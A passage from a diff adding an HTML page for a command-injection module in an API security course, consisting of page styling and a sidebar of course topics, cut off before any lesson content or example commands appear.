@@ -1,0 +1,2274 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark" data-lang="hi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Module 10: Command Injection (OS Command Execution) - API Security Notes</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:ital,wght@0,400;0,500;0,600;0,700;1,400;1,500;1,600&family=Sora:wght@400;500;600;700;800&family=Fira+Code:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="assets/css/style.css">
+
+  <style>
+    /* ==========================================================================
+       Module 10: Command Injection Custom Styling - High Contrast Cyber Theme
+       ========================================================================== */
+    body {
+      background: #040814;
+      color: #f1f5f9;
+      margin: 0;
+      padding: 0;
+      overflow-x: hidden;
+      overflow-y: visible;
+      font-family: var(--font-sans);
+      font-size: 1rem;
+      line-height: 1.7;
+    }
+
+    /* Master Layout: Sidebar + Main Area */
+    .app-dashboard-layout {
+      display: flex;
+      min-height: 100vh;
+    }
+
+    /* Left Sidebar */
+    .dashboard-sidebar {
+      width: 280px;
+      background: #070d1c;
+      border-right: 1px solid rgba(255, 255, 255, 0.07);
+      flex-shrink: 0;
+      display: flex;
+      flex-direction: column;
+      height: 100vh;
+      position: sticky;
+      top: 0;
+      overflow-y: auto;
+      scrollbar-width: thin;
+      scrollbar-color: #1e293b transparent;
+    }
+
+    .sidebar-header {
+      padding: 1.5rem 1.4rem 1rem;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .sidebar-brand-title {
+      font-family: var(--font-heading);
+      font-size: 1.25rem;
+      font-weight: 800;
+      color: #fff;
+      letter-spacing: -0.02em;
+    }
+    .sidebar-brand-title span {
+      color: #22c55e;
+    }
+
+    .sidebar-section-heading {
+      font-size: 0.75rem;
+      font-weight: 700;
+      color: #64748b;
+      padding: 0.8rem 1.4rem 0.6rem;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+    }
+
+    .vuln-nav-list {
+      list-style: none;
+      padding: 0 0.8rem;
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
+      margin: 0;
+    }
+
+    .vuln-nav-item {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 8px 14px;
+      border-radius: var(--radius-pill);
+      color: #f1f5f9;
+      text-decoration: none;
+      font-size: 0.86rem;
+      font-weight: 500;
+      transition: all 0.2s;
+    }
+
+    .vuln-nav-item:hover {
+      background: rgba(255, 255, 255, 0.04);
+      color: #f1f5f9;
+    }
+
+    .vuln-nav-item.active {
+      background: #15803d;
+      color: #ffffff;
+      font-weight: 700;
+      box-shadow: 0 4px 14px rgba(34, 197, 94, 0.4);
+    }
+
+    .nav-num-badge {
+      font-size: 0.72rem;
+      font-family: var(--font-mono);
+      font-weight: 700;
+      background: rgba(255, 255, 255, 0.1);
+      padding: 2px 7px;
+      border-radius: var(--radius-pill);
+      color: inherit;
+    }
+
+    .vuln-nav-item.active .nav-num-badge {
+      background: rgba(0, 0, 0, 0.25);
+      color: #fff;
+    }
+
+    /* Main Content Body */
+    .dashboard-main {
+      flex: 1;
+      padding: 1.4rem 2.4rem 0;
+      max-width: 1480px;
+      min-width: 0;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    /* Top Action Bar */
+    .main-top-actionbar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 14px;
+      margin-bottom: 1.5rem;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+      padding-bottom: 12px;
+    }
+
+    .actionbar-left {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .back-home-link {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      color: #94a3b8;
+      text-decoration: none;
+      font-size: 0.84rem;
+      font-weight: 600;
+      padding: 6px 12px;
+      border-radius: var(--radius-sm);
+      background: rgba(255, 255, 255, 0.04);
+      transition: all 0.2s;
+    }
+    .back-home-link:hover {
+      color: #22c55e;
+      background: rgba(34, 197, 94, 0.12);
+    }
+
+    .actionbar-controls {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .btn-action-control {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      padding: 6px 14px;
+      border-radius: var(--radius-pill);
+      background: rgba(255, 255, 255, 0.06);
+      border: 1px solid rgba(255, 255, 255, 0.12);
+      color: #f1f5f9;
+      font-size: 0.82rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+    .btn-action-control:hover {
+      background: rgba(255, 255, 255, 0.12);
+      border-color: rgba(255, 255, 255, 0.25);
+    }
+
+    /* Header Hero Grid */
+    .hero-top-grid {
+      display: grid;
+      grid-template-columns: 1.15fr 1fr;
+      gap: 1.8rem;
+      margin-bottom: 1.4rem;
+      align-items: center;
+    }
+
+    @media (max-width: 1024px) {
+      .hero-top-grid {
+        grid-template-columns: 1fr;
+        gap: 1.5rem;
+      }
+    }
+
+    .category-tag-row {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 0.75rem;
+    }
+
+    .pill-index-tag {
+      font-family: var(--font-mono);
+      background: #16a34a;
+      color: #fff;
+      font-weight: 700;
+      font-size: 0.75rem;
+      padding: 2px 8px;
+      border-radius: var(--radius-pill);
+    }
+
+    .pill-category-name {
+      color: #f1f5f9;
+      font-size: 0.82rem;
+      font-weight: 600;
+    }
+
+    .main-vuln-h1 {
+      font-family: var(--font-heading);
+      font-size: 2.35rem;
+      font-weight: 800;
+      line-height: 1.2;
+      color: #ffffff;
+      margin-bottom: 0.6rem;
+      letter-spacing: -0.02em;
+    }
+
+    .main-vuln-h1 span.title-green {
+      color: #22c55e;
+    }
+    .main-vuln-h1 span.title-red {
+      color: #f87171;
+    }
+
+    .main-vuln-desc {
+      font-size: 1.05rem;
+      color: #f1f5f9;
+      margin-bottom: 1.2rem;
+      line-height: 1.65;
+    }
+
+    /* Meta Badges */
+    .meta-tags-row {
+      display: flex;
+      gap: 8px;
+      flex-wrap: wrap;
+      align-items: center;
+      margin-bottom: 1.2rem;
+    }
+
+    .meta-chip {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      padding: 3px 10px;
+      border-radius: var(--radius-pill);
+      font-size: 0.74rem;
+      white-space: nowrap;
+      font-weight: 600;
+    }
+
+    .meta-chip.danger {
+      background: rgba(239, 68, 68, 0.12);
+      color: #f87171;
+      border: 1px solid rgba(239, 68, 68, 0.35);
+    }
+
+    .meta-chip.info {
+      background: rgba(34, 197, 94, 0.12);
+      color: #4ade80;
+      border: 1px solid rgba(34, 197, 94, 0.3);
+    }
+
+    .meta-chip.purple {
+      background: rgba(168, 85, 247, 0.12);
+      color: #c084fc;
+      border: 1px solid rgba(168, 85, 247, 0.3);
+    }
+
+    /* Quote Bubble */
+    .quote-bubble {
+      background: rgba(15, 23, 42, 0.7);
+      border: 1px solid rgba(34, 197, 94, 0.2);
+      border-radius: var(--radius-md);
+      padding: 0.9rem 1.3rem;
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      font-size: 0.94rem;
+      color: #f1f5f9;
+      line-height: 1.6;
+    }
+    .quote-icon-box {
+      font-size: 1.15rem;
+      flex-shrink: 0;
+      margin-top: 1px;
+    }
+
+    /* Hero Glass Graphic (Command Injection Simulator) */
+    .hero-glass-graphic {
+      background: linear-gradient(135deg, rgba(15, 23, 42, 0.85), rgba(7, 13, 28, 0.95));
+      border: 1px solid rgba(34, 197, 94, 0.25);
+      border-radius: var(--radius-lg);
+      padding: 1.2rem 1.4rem;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5), inset 0 1px 0 rgba(255, 255, 255, 0.05);
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      position: relative;
+    }
+
+    .hero-widget-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+      padding-bottom: 10px;
+    }
+
+    .hero-widget-badge {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .pulse-live-dot {
+      width: 8px;
+      height: 8px;
+      background: #22c55e;
+      border-radius: 50%;
+      box-shadow: 0 0 8px #22c55e;
+      animation: pulseGreen 1.6s infinite ease-in-out;
+    }
+    @keyframes pulseGreen {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.4; transform: scale(0.85); }
+    }
+
+    .hero-badge-title {
+      font-size: 0.82rem;
+      font-weight: 700;
+      color: #e2e8f0;
+      letter-spacing: 0.02em;
+    }
+
+    .hero-sim-pills {
+      display: flex;
+      gap: 6px;
+    }
+
+    .hero-sim-btn {
+      padding: 4px 10px;
+      border-radius: var(--radius-pill);
+      font-size: 0.72rem;
+      font-weight: 700;
+      cursor: pointer;
+      border: 1px solid rgba(255, 255, 255, 0.12);
+      background: rgba(255, 255, 255, 0.05);
+      color: #94a3b8;
+      transition: all 0.2s;
+    }
+    .hero-sim-btn:hover {
+      color: #fff;
+      background: rgba(255, 255, 255, 0.1);
+    }
+    .hero-sim-btn.active.safe {
+      background: rgba(34, 197, 94, 0.2);
+      border-color: #22c55e;
+      color: #4ade80;
+    }
+    .hero-sim-btn.active.exploit {
+      background: rgba(239, 68, 68, 0.2);
+      border-color: #ef4444;
+      color: #f87171;
+    }
+
+    .hero-widget-body {
+      display: grid;
+      grid-template-columns: 1fr auto 1.35fr;
+      align-items: center;
+      gap: 12px;
+      padding: 8px 0;
+    }
+
+    .attacker-graphic-node {
+      background: rgba(10, 15, 30, 0.8);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: var(--radius-md);
+      padding: 12px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+      gap: 6px;
+    }
+
+    .attacker-avatar-circle {
+      width: 44px;
+      height: 44px;
+      border-radius: 50%;
+      background: rgba(239, 68, 68, 0.15);
+      border: 1px solid rgba(239, 68, 68, 0.35);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.3rem;
+    }
+
+    .attacker-label {
+      font-size: 0.8rem;
+      font-weight: 700;
+      color: #f1f5f9;
+    }
+    .attacker-sub {
+      font-size: 0.72rem;
+      font-family: var(--font-mono);
+      color: #f87171;
+    }
+
+    .graphic-center-flow {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .graphic-url-pill {
+      background: #020617;
+      border: 1px solid rgba(255, 255, 255, 0.12);
+      border-radius: var(--radius-pill);
+      padding: 3px 10px;
+      font-size: 0.68rem;
+      font-family: var(--font-mono);
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .graphic-beam-track {
+      width: 90px;
+      height: 2px;
+      background: rgba(255, 255, 255, 0.1);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .graphic-beam-particle {
+      position: absolute;
+      top: 0;
+      left: -40%;
+      width: 40%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, #ef4444, transparent);
+      animation: beamSlide 1.5s infinite linear;
+    }
+    @keyframes beamSlide {
+      0% { left: -40%; }
+      100% { left: 100%; }
+    }
+
+    .graphic-flow-state {
+      font-size: 0.68rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.04em;
+    }
+
+    .target-profile-card {
+      background: rgba(10, 15, 30, 0.85);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: var(--radius-md);
+      padding: 10px 14px;
+      display: flex;
+      flex-direction: column;
+      gap: 5px;
+      font-size: 0.76rem;
+    }
+    .target-profile-card.exploit {
+      border-color: rgba(239, 68, 68, 0.35);
+      box-shadow: 0 0 15px rgba(239, 68, 68, 0.15);
+    }
+    .target-profile-card.safe {
+      border-color: rgba(34, 197, 94, 0.35);
+      box-shadow: 0 0 15px rgba(34, 197, 94, 0.15);
+    }
+
+    .target-header-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 2px;
+    }
+
+    .target-pill-status {
+      font-size: 0.65rem;
+      font-weight: 800;
+      padding: 2px 6px;
+      border-radius: 4px;
+    }
+    .target-pill-status.breach {
+      background: rgba(239, 68, 68, 0.25);
+      color: #f87171;
+    }
+    .target-pill-status.blocked {
+      background: rgba(34, 197, 94, 0.25);
+      color: #4ade80;
+    }
+
+    .target-data-line {
+      font-family: var(--font-mono);
+      font-size: 0.72rem;
+      color: #94a3b8;
+    }
+
+    /* Tab Underline Bar (Exact ssrf.html Parity) */
+    .tab-underline-bar {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+      margin-bottom: 1.5rem;
+      overflow-x: auto;
+      scrollbar-width: none;
+    }
+    .tab-underline-bar::-webkit-scrollbar { display: none; }
+
+    .tab-underline-btn {
+      padding: 10px 18px;
+      background: none;
+      border: none;
+      border-bottom: 2px solid transparent;
+      color: #94a3b8;
+      font-size: 0.9rem;
+      font-weight: 600;
+      cursor: pointer;
+      white-space: nowrap;
+      transition: all 0.2s;
+    }
+    .tab-underline-btn:hover {
+      color: #f1f5f9;
+    }
+    .tab-underline-btn.active {
+      color: #22c55e;
+      border-bottom-color: #22c55e;
+    }
+
+    /* Tab Contents */
+    .tab-content {
+      display: none;
+      animation: fadeInTab 0.25s ease-in-out;
+    }
+    .tab-content.active {
+      display: block;
+    }
+    @keyframes fadeInTab {
+      from { opacity: 0; transform: translateY(4px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* Standardized Card Container */
+    .panel-card {
+      background: rgba(13, 19, 38, 0.75);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: var(--radius-lg);
+      padding: 1.8rem 2.2rem;
+      margin-bottom: 1.8rem;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.25);
+    }
+
+    .panel-card h3 {
+      font-family: var(--font-heading);
+      font-size: 1.35rem;
+      font-weight: 700;
+      color: #ffffff;
+      margin-top: 0;
+      margin-bottom: 0.9rem;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .panel-card h4 {
+      font-family: var(--font-heading);
+      font-size: 1.12rem;
+      color: #4ade80;
+      margin-top: 1.4rem;
+      margin-bottom: 0.6rem;
+    }
+
+    /* Compare Code Box (Side-by-side or Stacked) */
+    .compare-container {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 1.4rem;
+      margin-top: 1.2rem;
+    }
+    @media (max-width: 900px) {
+      .compare-container {
+        grid-template-columns: 1fr;
+      }
+    }
+
+    .compare-box {
+      border-radius: var(--radius-md);
+      overflow: hidden;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      display: flex;
+      flex-direction: column;
+    }
+    .compare-box.vuln {
+      border-color: rgba(239, 68, 68, 0.35);
+      background: rgba(239, 68, 68, 0.03);
+    }
+    .compare-box.safe {
+      border-color: rgba(34, 197, 94, 0.35);
+      background: rgba(34, 197, 94, 0.03);
+    }
+
+    .compare-header {
+      padding: 8px 14px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 0.78rem;
+      font-weight: 700;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+    }
+    .compare-box.vuln .compare-header {
+      background: rgba(239, 68, 68, 0.15);
+      color: #f87171;
+    }
+    .compare-box.safe .compare-header {
+      background: rgba(34, 197, 94, 0.15);
+      color: #4ade80;
+    }
+
+    .code-terminal-pre {
+      margin: 0;
+      padding: 1.1rem 1.3rem;
+      font-family: var(--font-mono);
+      font-size: 0.84rem;
+      line-height: 1.65;
+      background: #060913;
+      color: #e2e8f0;
+      overflow-x: auto;
+    }
+
+    /* Terminal Syntax Highlighting */
+    .t-kw { color: #f43f5e; font-weight: 600; }
+    .t-fn { color: #38bdf8; }
+    .t-str { color: #4ade80; }
+    .t-cmd { color: #fbbf24; font-weight: 700; }
+    .t-op { color: #f87171; font-weight: 700; }
+    .t-cmt { color: #64748b; font-style: italic; }
+    .t-var { color: #c084fc; }
+    .t-key { color: #38bdf8; }
+    .t-num { color: #f59e0b; }
+    .t-bool { color: #a855f7; }
+
+    /* Scenario Card */
+    .scenario-card {
+      background: rgba(10, 15, 30, 0.65);
+      border: 1px solid rgba(255, 255, 255, 0.07);
+      border-radius: var(--radius-md);
+      padding: 1.4rem 1.6rem;
+      margin-bottom: 1.4rem;
+    }
+    .scenario-title {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 1.1rem;
+      font-weight: 700;
+      color: #ffffff;
+      margin-bottom: 0.6rem;
+    }
+    .scenario-badge {
+      font-size: 0.72rem;
+      padding: 2px 8px;
+      border-radius: var(--radius-pill);
+      font-family: var(--font-mono);
+      font-weight: 700;
+      background: rgba(34, 197, 94, 0.15);
+      color: #4ade80;
+      border: 1px solid rgba(34, 197, 94, 0.3);
+    }
+
+    /* Interactive Lab Console (Tab 6) */
+    .lab-panel {
+      background: #070c1a;
+      border: 1px solid rgba(34, 197, 94, 0.3);
+      border-radius: var(--radius-lg);
+      padding: 1.6rem 2rem;
+      box-shadow: 0 10px 35px rgba(0, 0, 0, 0.5);
+    }
+
+    .lab-controls-bar {
+      display: flex;
+      gap: 12px;
+      align-items: center;
+      flex-wrap: wrap;
+      margin-bottom: 1.2rem;
+      background: rgba(15, 23, 42, 0.7);
+      padding: 10px 14px;
+      border-radius: var(--radius-md);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+    }
+
+    .lab-method-badge {
+      font-family: var(--font-mono);
+      font-size: 0.85rem;
+      font-weight: 800;
+      padding: 5px 12px;
+      border-radius: var(--radius-sm);
+      background: #16a34a;
+      color: #fff;
+    }
+
+    .lab-endpoint-text {
+      font-family: var(--font-mono);
+      font-size: 0.88rem;
+      color: #cbd5e1;
+      font-weight: 600;
+    }
+
+    .lab-mode-switch {
+      margin-left: auto;
+      display: flex;
+      gap: 6px;
+    }
+
+    .lab-mode-btn {
+      padding: 5px 14px;
+      font-size: 0.78rem;
+      font-weight: 700;
+      border-radius: var(--radius-pill);
+      border: 1px solid rgba(255, 255, 255, 0.12);
+      background: rgba(255, 255, 255, 0.05);
+      color: #94a3b8;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+    .lab-mode-btn.active.exploit {
+      background: rgba(239, 68, 68, 0.25);
+      border-color: #ef4444;
+      color: #f87171;
+    }
+    .lab-mode-btn.active.safe {
+      background: rgba(34, 197, 94, 0.25);
+      border-color: #22c55e;
+      color: #4ade80;
+    }
+
+    .lab-presets-row {
+      display: flex;
+      gap: 8px;
+      flex-wrap: wrap;
+      margin-bottom: 1rem;
+    }
+
+    .lab-preset-btn {
+      padding: 5px 12px;
+      border-radius: var(--radius-pill);
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      color: #cbd5e1;
+      font-size: 0.78rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+    .lab-preset-btn:hover {
+      background: rgba(255, 255, 255, 0.12);
+      color: #fff;
+    }
+    .lab-preset-btn.active {
+      background: rgba(34, 197, 94, 0.2);
+      border-color: #22c55e;
+      color: #4ade80;
+    }
+
+    .lab-input-group {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 1.4rem;
+    }
+
+    .lab-input-field {
+      flex: 1;
+      background: #030712;
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      border-radius: var(--radius-sm);
+      padding: 10px 14px;
+      color: #fff;
+      font-family: var(--font-mono);
+      font-size: 0.9rem;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+    .lab-input-field:focus {
+      border-color: #22c55e;
+      box-shadow: 0 0 10px rgba(34, 197, 94, 0.25);
+    }
+
+    .lab-execute-btn {
+      padding: 10px 22px;
+      background: linear-gradient(135deg, #16a34a, #15803d);
+      border: none;
+      border-radius: var(--radius-sm);
+      color: #fff;
+      font-weight: 700;
+      font-size: 0.88rem;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      transition: all 0.2s;
+    }
+    .lab-execute-btn:hover {
+      background: linear-gradient(135deg, #22c55e, #16a34a);
+      box-shadow: 0 0 15px rgba(34, 197, 94, 0.4);
+    }
+
+    .lab-output-grid {
+      display: grid;
+      grid-template-columns: 1fr 1.3fr;
+      gap: 1.2rem;
+    }
+    @media (max-width: 900px) {
+      .lab-output-grid {
+        grid-template-columns: 1fr;
+      }
+    }
+
+    .lab-box-container {
+      background: #030712;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: var(--radius-md);
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .lab-box-header {
+      padding: 8px 14px;
+      background: rgba(255, 255, 255, 0.03);
+      border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+      font-size: 0.76rem;
+      font-weight: 700;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      color: #94a3b8;
+    }
+
+    .lab-stepper {
+      padding: 14px;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      font-size: 0.82rem;
+    }
+
+    .lab-step-item {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      line-height: 1.5;
+    }
+
+    .step-icon-badge {
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 0.72rem;
+      font-weight: 800;
+      flex-shrink: 0;
+    }
+    .step-icon-badge.info { background: rgba(56, 189, 248, 0.2); color: #38bdf8; }
+    .step-icon-badge.ok { background: rgba(34, 197, 94, 0.2); color: #4ade80; }
+    .step-icon-badge.fail { background: rgba(239, 68, 68, 0.2); color: #f87171; }
+
+    .terminal-output-pre {
+      margin: 0;
+      padding: 14px;
+      font-family: var(--font-mono);
+      font-size: 0.84rem;
+      line-height: 1.6;
+      color: #e2e8f0;
+      background: #020617;
+      min-height: 180px;
+      max-height: 360px;
+      overflow-y: auto;
+    }
+
+    /* Checklist Styling */
+    .checklist-container {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .checklist-item {
+      background: rgba(10, 15, 30, 0.75);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: var(--radius-md);
+      padding: 14px 18px;
+      display: flex;
+      align-items: flex-start;
+      gap: 14px;
+      transition: all 0.2s ease;
+      cursor: pointer;
+    }
+    .checklist-item:hover {
+      background: rgba(15, 23, 42, 0.85);
+      border-color: rgba(34, 197, 94, 0.3);
+    }
+    .checklist-item.item-passed {
+      border-color: rgba(34, 197, 94, 0.4);
+      background: rgba(34, 197, 94, 0.04);
+    }
+    .checklist-item.item-failed {
+      border-color: rgba(239, 68, 68, 0.4);
+      background: rgba(239, 68, 68, 0.04);
+    }
+
+    .check-mark-icon {
+      width: 26px;
+      height: 26px;
+      border-radius: 50%;
+      background: rgba(255, 255, 255, 0.06);
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      font-size: 0.78rem;
+      font-weight: 700;
+      color: #94a3b8;
+    }
+    .checklist-item.item-passed .check-mark-icon {
+      background: rgba(34, 197, 94, 0.25);
+      border-color: #22c55e;
+      color: #4ade80;
+    }
+    .checklist-item.item-failed .check-mark-icon {
+      background: rgba(239, 68, 68, 0.25);
+      border-color: #ef4444;
+      color: #f87171;
+    }
+
+    .check-content {
+      flex: 1;
+    }
+    .check-content h5 {
+      margin: 0 0 4px 0;
+      font-size: 0.98rem;
+      color: #ffffff;
+    }
+    .check-content p {
+      margin: 0;
+      font-size: 0.86rem;
+      color: #94a3b8;
+      line-height: 1.5;
+    }
+
+    .check-how-to-box {
+      margin-top: 8px;
+      background: rgba(0, 0, 0, 0.35);
+      border: 1px dashed rgba(34, 197, 94, 0.25);
+      border-radius: 6px;
+      padding: 6px 12px;
+      font-size: 0.82rem;
+      color: #cbd5e1;
+    }
+
+    .check-actions-bar {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-top: 10px;
+    }
+
+    .check-status-btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      padding: 5px 12px;
+      border-radius: var(--radius-sm);
+      font-size: 0.78rem;
+      font-weight: 700;
+      cursor: pointer;
+      border: 1px solid rgba(255, 255, 255, 0.12);
+      background: rgba(15, 23, 42, 0.8);
+      color: #94a3b8;
+      transition: all 0.2s ease;
+    }
+    .check-status-btn:hover {
+      background: rgba(255, 255, 255, 0.1);
+      color: #f1f5f9;
+    }
+    .check-status-btn.pass-btn.active {
+      background: rgba(34, 197, 94, 0.25) !important;
+      border-color: #22c55e !important;
+      color: #4ade80 !important;
+      box-shadow: 0 0 10px rgba(34, 197, 94, 0.3);
+    }
+    .check-status-btn.fail-btn.active {
+      background: rgba(239, 68, 68, 0.25) !important;
+      border-color: #ef4444 !important;
+      color: #f87171 !important;
+      box-shadow: 0 0 10px rgba(239, 68, 68, 0.3);
+    }
+
+    /* FAQ Accordion */
+    .faq-item {
+      background: rgba(10, 15, 30, 0.65);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: var(--radius-md);
+      margin-bottom: 12px;
+      overflow: hidden;
+    }
+
+    .faq-question {
+      padding: 14px 18px;
+      font-weight: 700;
+      font-size: 0.96rem;
+      color: #f1f5f9;
+      cursor: pointer;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      background: rgba(255, 255, 255, 0.02);
+      transition: background 0.2s;
+    }
+    .faq-question:hover {
+      background: rgba(255, 255, 255, 0.05);
+    }
+
+    .faq-answer {
+      padding: 14px 18px;
+      border-top: 1px solid rgba(255, 255, 255, 0.06);
+      font-size: 0.9rem;
+      color: #cbd5e1;
+      line-height: 1.65;
+    }
+
+    /* Light Theme Support */
+    html[data-theme="light"] body {
+      background: #f8fafc;
+      color: #0f172a;
+    }
+    html[data-theme="light"] .dashboard-sidebar {
+      background: #ffffff;
+      border-right-color: #e2e8f0;
+    }
+    html[data-theme="light"] .sidebar-brand-title {
+      color: #0f172a;
+    }
+    html[data-theme="light"] .vuln-nav-item {
+      color: #334155;
+    }
+    html[data-theme="light"] .vuln-nav-item:hover {
+      background: #f1f5f9;
+      color: #0f172a;
+    }
+    html[data-theme="light"] .panel-card,
+    html[data-theme="light"] .scenario-card,
+    html[data-theme="light"] .faq-item,
+    html[data-theme="light"] .checklist-item {
+      background: #ffffff;
+      border-color: #e2e8f0;
+      color: #1e293b;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
+    }
+    html[data-theme="light"] .main-vuln-h1 {
+      color: #0f172a;
+    }
+    html[data-theme="light"] .main-vuln-desc,
+    html[data-theme="light"] .check-content p,
+    html[data-theme="light"] .faq-answer {
+      color: #334155;
+    }
+    html[data-theme="light"] .quote-bubble {
+      background: #f0fdf4;
+      border-color: #bbf7d0;
+      color: #166534;
+    }
+    html[data-theme="light"] .quote-bubble strong {
+      color: #15803d;
+    }
+    html[data-theme="light"] .lab-panel {
+      background: #f8fafc;
+      border-color: #cbd5e1;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="app-dashboard-layout">
+
+    <!-- ====================================================================
+         LEFT SIDEBAR NAVIGATION
+         ==================================================================== -->
+    <aside class="dashboard-sidebar">
+      <div class="sidebar-header">
+        <a href="index.html" class="sidebar-brand-title" style="text-decoration:none; display:block;">API <span>SECURITY</span></a>
+      </div>
+
+      <div class="sidebar-section-heading">Foundations</div>
+      <ul class="vuln-nav-list" style="margin-bottom: 0.5rem;">
+        <li><a href="api-intro.html" class="vuln-nav-item"><span class="nav-num-badge">00</span> API Fundamentals</a></li>
+      </ul>
+
+      <div class="sidebar-section-heading">Common Vulnerabilities</div>
+      <ul class="vuln-nav-list">
+        <li><a href="bola.html" class="vuln-nav-item"><span class="nav-num-badge">01</span> BOLA</a></li>
+        <li><a href="bfla.html" class="vuln-nav-item"><span class="nav-num-badge">02</span> BFLA</a></li>
+        <li><a href="idor.html" class="vuln-nav-item"><span class="nav-num-badge">03</span> IDOR</a></li>
+        <li><a href="jwt.html" class="vuln-nav-item"><span class="nav-num-badge">04</span> JWT Vulnerabilities</a></li>
+        <li><a href="mass-assignment.html" class="vuln-nav-item"><span class="nav-num-badge">05</span> Mass Assignment</a></li>
+        <li><a href="excessive-data-exposure.html" class="vuln-nav-item"><span class="nav-num-badge">06</span> Excessive Data Exposure</a></li>
+        <li><a href="rate-limiting.html" class="vuln-nav-item"><span class="nav-num-badge">07</span> Rate Limiting</a></li>
+        <li><a href="ssrf.html" class="vuln-nav-item"><span class="nav-num-badge">08</span> SSRF</a></li>
+        <li><a href="nosql-injection.html" class="vuln-nav-item"><span class="nav-num-badge">09</span> NoSQL Injection</a></li>
+        <li><a href="command-injection.html" class="vuln-nav-item active"><span class="nav-num-badge">10</span> Command Injection</a></li>
+        <li><a href="#" class="vuln-nav-item"><span class="nav-num-badge">11</span> XXE</a></li>
+        <li><a href="#" class="vuln-nav-item"><span class="nav-num-badge">12</span> GraphQL Security</a></li>
+        <li><a href="#" class="vuln-nav-item"><span class="nav-num-badge">13</span> Business Logic</a></li>
+        <li><a href="#" class="vuln-nav-item"><span class="nav-num-badge">14</span> CORS Misconfig</a></li>
+        <li><a href="#" class="vuln-nav-item"><span class="nav-num-badge">15</span> API Key Security</a></li>
+        <li><a href="#" class="vuln-nav-item"><span class="nav-num-badge">16</span> OAuth & OpenID</a></li>
+        <li><a href="#" class="vuln-nav-item"><span class="nav-num-badge">17</span> Webhooks Security</a></li>
+        <li><a href="#" class="vuln-nav-item"><span class="nav-num-badge">18</span> Race Conditions</a></li>
+        <li><a href="#" class="vuln-nav-item"><span class="nav-num-badge">19</span> File Upload</a></li>
+      </ul>
+    </aside>
+
